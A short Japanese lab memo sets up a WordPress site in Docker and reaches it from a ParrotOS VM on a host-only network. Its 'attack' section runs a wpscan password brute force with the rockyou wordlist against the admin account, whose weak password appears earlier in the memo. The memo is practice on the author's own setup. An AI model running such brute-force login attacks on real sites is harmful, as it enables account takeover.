### docker側
- dockerデスクトップを起動する
- compose.yamlのファイルまで移動する
- `docker compose up -d`
- dockerでwordpressを設定のためWindowsのブラウザでアクセスする。`http://localhost:8080/wp-admin`
  - ユーザ名:hitoshi
  - パスワード:dragon
- 起動を確認したら消してもいい

### virtualBox
- Parrotのネットワークの設定をホストオンリーであるのを確認
- ParrotOSを起動する
- `sudo arp-scan -l`Windowsっぽいのを探す
  - `192.168.56.100`以外のアドレス 
- Parrotのブラウザでさっき探したIPアドレス:8080でアクセスする。アクセスできることを確認する

### 攻撃
- wpscanをする
  - `wpscan --url http://アドレス:8080 -U 'hitoshi' -P /usr/share/wordlists/rockyou.txt` 
- ダッシュボードにログインする
  - `http://アドレス:8080/wp-login.php`
